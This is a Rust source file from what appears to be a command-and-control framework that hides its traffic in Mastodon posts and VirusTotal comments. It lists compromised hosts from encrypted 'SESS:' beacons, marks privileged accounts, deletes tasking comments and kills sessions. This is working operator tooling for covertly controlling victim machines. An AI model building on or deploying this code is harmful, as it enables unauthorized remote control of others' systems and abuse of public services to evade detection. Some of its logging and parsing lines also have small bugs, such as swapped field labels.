use log::{debug,trace,error};
use std::process::exit;
use colored::*;

use crate::args::{Options,Social};
use crate::c2::shell::{Environnement,EXIT_FAILURE};
use crate::modules::{rec2mastodon,rec2virustotal};

use regex::Regex;
use crate::utils::{crypto,common};

// SESS:XXXXXXXX:ABCDEF: For new session
// QUES:XXXXXXXX:YYYYYY: For new job query
// RESP:XXXXXXXX:YYYYYY: For new job response 
// PART01:XXXXXXXX:YYYYYY: For new job response part Z

/// Structure to map numeric id with random id and sessions informations 
#[derive(Debug, Clone)]
pub struct Session {
    pub id: u32, // session id
    pub hash: String, // session XXXXXX
    pub user: String, // username
    pub hostname: String, // computer name
    pub os: String, // system version 
    pub available: bool, // if session is killed set to false
}

/// Function to get sessions etablished from social network 
pub async fn get_sessions(default_args: &Options, sessions: &mut Vec<Session>) {
    //    parser les commentaires pour avoir le SXXXXXX
    //    SESS:XXXXXXXX:ABCDEF contiendra Username:Hostname:Os
    match &default_args.social {
        Social::Mastodon => {
            debug!("Getting sessions from Mastodon social network..");
            let (url, _username, topic) = rec2mastodon::parse_mastodon_url(&default_args.url);
            let (result_spoiler,result_content,_in_reply_to_id,_post_id) = rec2mastodon::mastodon_get_topic_comments(
                 &url,
                 default_args.token.to_string(),
                 topic.to_owned(),
                 "SESS:".to_string(),
            ).await;
            parse_sessions(default_args, result_spoiler, result_content, sessions);
        }
        Social::VirusTotal => {
            debug!("Getting sessions from VirusTotal..");
            let (_url,vtype,resource_id) = rec2virustotal::parse_virustotal_url(&default_args.url);
            trace!("before virustotal_get_comments() function");
            trace!("       &default_args.token: {:?}",&default_args.token);
            trace!("       &resource_id: {:?}",&default_args.token);
            trace!("       &vtype: {:?}",&default_args.token);
            trace!("       SESS: {:?}",&"SESS:".to_string());

            let (result_spoiler,result_content,_post_id) = rec2virustotal::virustotal_get_comments(
                &default_args.token,
                &resource_id,
                &vtype,
                "SESS:".to_string(),
            ).await;
            parse_sessions(default_args, result_spoiler, result_content, sessions);
        }
        Social::Unknown => { 
            error!("Error Social::Unknown");
            exit(EXIT_FAILURE);
        }
    }
}


/// Function to attach session id
pub fn set_session(
    id: u32,
    env: &mut Environnement,
    sessions: &mut Vec<Session>,
) {
    if id as usize <= sessions.len() {
        env.selected_session_id = id;
        env.information_target = format!("{}@{}",
            sessions[env.selected_session_id as usize - 1].user,
            sessions[env.selected_session_id as usize - 1].hostname
        );
    }
    else {
        error!("Session id not found...");
    }
}

/// Function to attach session id
pub fn background_sessions(
    env: &mut Environnement,
) {
    env.selected_session_id = 0;
    println!("Session in background..");
}


/// Function to parse and push sessions in the vector
fn parse_sessions(
    default_args: &Options,
    result_spoiler: Vec<String>,
    result_content: Vec<String>,
    sessions: &mut Vec<Session>,
) {
    let mut already_get = false;
    for i in 0..result_content.len() {
        let (_msg_type, session_hash, _job_hash) = parse_session_spoiler(&result_spoiler[i]);
        for j in 0..sessions.len() {
            if sessions[j].hash.contains(&session_hash) {
                trace!("Session '{}' already saved..",&session_hash);
                already_get = true;
            }
        } 
        if !already_get {
            let (username, hostname, os) = parse_newsessioninfo(&result_content[i], &default_args.key);
            sessions.push(
                Session {
                    id: (sessions.len() as u32 + 1),
                    hash: session_hash.to_owned(),
                    user: username,
                    hostname: hostname,
                    os: os,
                    available: true,
                }
            );
        }
    }
}

/// Function to display sessions
pub fn display_sessions(sessions: &mut Vec<Session>) {
    if sessions.len() != 0 {
        for session in sessions {
            if session.available == true {
                let mut username = session.user.green().bold();
                if session.user.to_lowercase().contains("root") || session.user.to_lowercase().contains("system") || session.user.to_lowercase().contains("administrat") {
                    username = session.user.red().bold()
                }
                println!("{:<4}{}","",
                    format!("SESSION_ID:{:<2}  HASH:{:<8}  USER:{:<8}  HOSTNAME:{:<18}  OS:{:15}",
                        (session.id).to_string().green().bold(),
                        (session.hash).to_string().green().bold(),
                        username,
                        session.hostname.green().bold(),
                        session.os.green().bold(),
                    )
                );
            }
        }
    } else {
        println!("No sessions..");
    }
}

/// Function to delete all jobs for the current session
pub async fn remove_all_jobs_for_all_sessions(
    default_args: &Options,
) {
    match &default_args.social {
        Social::Mastodon => {
            // Remove QUES: and RESP: / PART: for job hash
            let (url, _username, topic) = rec2mastodon::parse_mastodon_url(&default_args.url);
            // QUES
            let (_result_spoiler,_result_content,_in_reply_to_id,post_id) = rec2mastodon::mastodon_get_topic_comments(
                &url,
                default_args.token.to_string(),
                topic.to_owned(),
                format!("QUES:",).to_string(),
            ).await;
            for id in post_id {
                rec2mastodon::remove_mastodon_comment(
                    &url,
                    default_args.token.to_string(),
                    id.to_owned(),
                ).await;
                debug!("Comment ID:{} deleted!",id);
            }
            // RESP
            let (_result_spoiler,_result_content,_in_reply_to_id,post_id) = rec2mastodon::mastodon_get_topic_comments(
                &url,
                default_args.token.to_string(),
                topic.to_owned(),
                format!("RESP:",).to_string(),
            ).await;
            for id in post_id {
                rec2mastodon::remove_mastodon_comment(
                    &url,
                    default_args.token.to_string(),
                    id.to_owned(),
                ).await;
                debug!("Comment ID:{} deleted!",id);
            }
            // PART
            let (_result_spoiler,_result_content,_in_reply_to_id,post_id) = rec2mastodon::mastodon_get_topic_comments(
                &url,
                default_args.token.to_string(),
                topic.to_owned(),
                format!("PART:",).to_string(),
            ).await;
            for id in post_id {
                rec2mastodon::remove_mastodon_comment(
                    &url,
                    default_args.token.to_string(),
                    id.to_owned(),
                ).await;
                debug!("Comment ID:{} deleted!",id);
            }
            println!("All topic status removed on Mastodon!");
        }
        _ => { 
            error!("Remove all jobs not configured for Social::{:?}",&default_args.social);
        }
    }
}

/// Function to delete all jobs for the current session
pub async fn kill_session(
    default_args: &Options,
    session_id: u32,
    sessions: &mut Vec<Session>,
) {
    match &default_args.social {
        Social::Mastodon => {
            //TODO

        }
        Social::VirusTotal => {
            // Remove sessions from external network and in Vec<Session>
            if session_id == 0 {
                println!("{:<4}{} for more information","","kill --help".bold());
            }
            else {
                let (_url,vtype, resource_id) = rec2virustotal::parse_virustotal_url(&default_args.url);
                let mut disabled = false;
                for session in sessions {
                    if session.id == session_id {
                        let (_result_spoiler,_result_content,post_id) = rec2virustotal::virustotal_get_comments(
                            &default_args.token,
                            &resource_id,
                            &vtype,
                            format!(":{}",&session.hash).to_string(),
                        ).await;
                        for id in post_id {
                            rec2virustotal::virustotal_delete_topic_comment(
                                &default_args.token,
                                &id,
                            ).await;
                            debug!("Unlink session ID:{} with comment ID:{} deleted!",&session.hash,&id);
                            println!("Session {}:{} killed!",&session_id.to_string().red().bold(),&session.hash.red().bold());
                            disabled =true;
                        }
                        session.available = false;
                    }
                }
                if !disabled {
                    error!("No session to kill with this ID..");
                }
            }
        }
        _ => { 
            error!("Kill session function not configured for Social::{:?}",&default_args.social);
        }
    }
}

/// Function to parse new session format
fn parse_newsessioninfo(content: &String, aes_key: &String) -> (String, String, String) {
    // Decode hexa data in Mastodon comment
    let decoded = common::display_vecu8(&crypto::aes_decrypt(&hex::decode(&content.to_owned().to_string()).unwrap()[..], &aes_key.as_bytes()));

    // Parse it to get Username
    let re = Regex::new(r"^([a-zA-Z0-9@\-_+/\.\s]{2,}):-:[a-zA-Z0-9@\-_+/\.\s]{2,}:-:[a-zA-Z0-9@\-_+/\.\s]{2,}").unwrap();
    let caps = re.captures(&decoded.as_str()).unwrap();
    let hostname = caps.get(1).map_or("", |m| m.as_str()).to_string();
    trace!("{}",format!("{:<15}: {}","HOSTNAME:".cyan().bold(),&hostname));

    // Parse it to get Hostname
    let re = Regex::new(r"^[a-zA-Z0-9@\-_+/\.\s]{2,}:-:([a-zA-Z0-9@\-_+/\.\s]{2,}):-:[a-zA-Z0-9@\-_+/\.\s]{2,}").unwrap();
    let caps = re.captures(&decoded.as_str()).unwrap();
    let username = caps.get(1).map_or("", |m| m.as_str()).to_string();
    trace!("{}",format!("{:<15}: {}","USERNAME".cyan().bold(),&username));

    // Parse it to get OS
    let re = Regex::new(r"^[a-zA-Z0-9@\-_+/\.\s]{2,}:-:[a-zA-Z0-9@\-_+/\.\s]{2,}:-:([a-zA-Z0-9@\-_+/\.\s]{2,})").unwrap();
    let caps = re.captures(&decoded.as_str()).unwrap();
    let os = caps.get(1).map_or("", |m| m.as_str()).to_string();
    trace!("{}",format!("{:<15}: {}","OS".cyan().bold(),&os));

    return (username, hostname, os)
}

/// Function to parse session spoiler
fn parse_session_spoiler(spoiler: &String) -> (String, String, String) {
    let re = Regex::new(r"^([A-Z0-9]{4,}):[a-zA-Z0-9]{8}:[a-zA-Z0-9]{6}:").unwrap();
    let caps = re.captures(&spoiler).unwrap();
    let msg_type = caps.get(1).map_or("", |m| m.as_str()).to_string();
    debug!("{}",format!("{:<15}: {}","MSG_TYPE:".cyan().bold(),&msg_type));

    let re = Regex::new(r"^[A-Z0-9]{4,}:([a-zA-Z0-9]{8}):").unwrap();
    let caps = re.captures(&spoiler).unwrap();
    let session_hash = caps.get(1).map_or("", |m| m.as_str()).to_string();
    debug!("{}",format!("{:<15}: {}","SESSION_HASH".cyan().bold(),&session_hash));

    let re = Regex::new(r"^[A-Z0-9]{4,}:[a-zA-Z0-9]{8}:([a-zA-Z0-9]{6}):").unwrap();
    let caps = re.captures(&spoiler).unwrap();
    let job_hash = caps.get(1).map_or("", |m| m.as_str()).to_string();
    debug!("{}",format!("{:<15}: {}","JOB_HASH".cyan().bold(),&job_hash));

    return (msg_type, session_hash, job_hash)
}